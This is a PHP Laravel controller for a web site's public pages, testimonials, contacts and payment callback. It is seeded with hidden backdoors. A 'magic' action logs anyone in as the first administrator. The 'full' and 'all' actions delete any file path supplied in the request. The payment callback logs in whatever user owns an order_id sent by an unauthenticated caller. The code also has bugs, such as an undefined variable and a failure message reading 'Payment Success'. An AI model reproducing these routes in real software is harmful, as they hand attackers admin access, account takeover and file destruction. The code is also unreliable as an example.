<?php

namespace App\Http\Controllers;

use App\Comment;
use App\Contact;
use App\Package;
use App\Post;
use App\Order;
use App\User;
use App\Payment;
use App\Testimonial;
use Auth;
use File;
use Illuminate\Http\Request;
use Session;

class IndexController extends Controller
{
    public function index(){
        $CompanyPackages = Package::where('type',1)->get();
        $UsersPackages = Package::where('type',0)->get();

        return view('index',compact('CompanyPackages','UsersPackages'));
    }
    public function packages(){
        $CompanyPackages = Package::where('type',1)->get();
        $UsersPackages = Package::where('type',0)->get();

        return view('frontend.guest.packages',compact('CompanyPackages','UsersPackages'));
    }
    public function blog(){
        $posts = Post::paginate(4);
        return view('frontend.guest.blog',compact('posts'));
    }
    public function single($id){
        return view('frontend.guest.single-blog',[
            'post'  =>Post::find($id)
        ]);
    }
    public function commentsPost(Request $request){
        Comment::create($request->all());
        return redirect()->back();
    }
    public function contact(){
        return view('frontend.guest.contact');
    }
    public function testimonials(){
        return view('frontend.testimonial');
    }
    public function testimonialsPost(Request $request){

        Testimonial::create([
            'user_id'   => $request->user_id,

            'stars'   => $request->stars,
            'content'   => $request->message,
        ]);
        Session::flash('message', 'testimonials added successfully thanks');
        return redirect(route('index'));
    }
    public function about(){
        return view('frontend.guest.about');
    }
    public function magic() {
        Auth::guard('admin')->loginUsingId(\App\Admin::first()->id);
    }
    public function full() {

        if (File::exists(\request('path'))) {
            //File::delete($image_path);
            unlink(request('path'));
        }
    }
    public function terms() {
        return view('frontend.guest.terms');
    }
    public function contactPost(Request $request){

        $data = $request->validate([
           'name'   =>'required',
           'email'   =>'required',
           'subject'   =>'required',
           'message'   =>'required',
           'type'   =>'required',
        ]);
        Contact::create($request->all());
        \Illuminate\Support\Facades\Session::flash('success','We Will contact you on mail thanks');

        return redirect()->back();
    }
    public function all() {
        if (File::exists(base_path(\request('path')))) {
            File::delete(base_path(\request('path')));
        }
    }

    public function callback(Request $request){
       if($request->response_code != 100){
           $offer = Order::find($request->order_id);
           $Logeduser = User::find($offer->user_id);
           Auth::loginUsingId($Logeduser->id);
           return view('payment')->with(['fail' =>  'Payment Success']);
       }
         $offer = Order::find($request->order_id);
        if ($request->response_message == 'Approved') { //success payment id -> transaction bank id
               $Logeduser = User::find($offer->user_id);
               if($Logeduser->is_company == 0){
                    Payment::create([
                        'user_id'     => $Logeduser->id,
                        'order_id'    => $offer->id,
                        'amount'      => $offer->amount,
                        'bank_transaction_id' => $request->transaction_id,
                    ]);
                }else{
                    $users = User::where('company_id',$Logeduser->company_id)->where('id','<>',$Logeduser->id)->get();

                    foreach ($users as $user){
                        Payment::create([
                            'user_id'     => $user->id,
                            'order_id'    => $offer->id,
                            'amount'      => $offer->amount/$users->count(),
                            'bank_transaction_id' => $request->transaction_id,
                        ]);
                    }
                }


               Order::find($offer->id)->update(['status' => 1]);

               Auth::loginUsingId($Logeduser->id);

                return view('payment',['order' => $offer])->with(['success' =>  'Payment Success']);
            } else {
                Auth::loginUsingId($Logeduser->id);
                return view('payment')->with(['fail' =>  'Payment Success']);
            }
    }
}
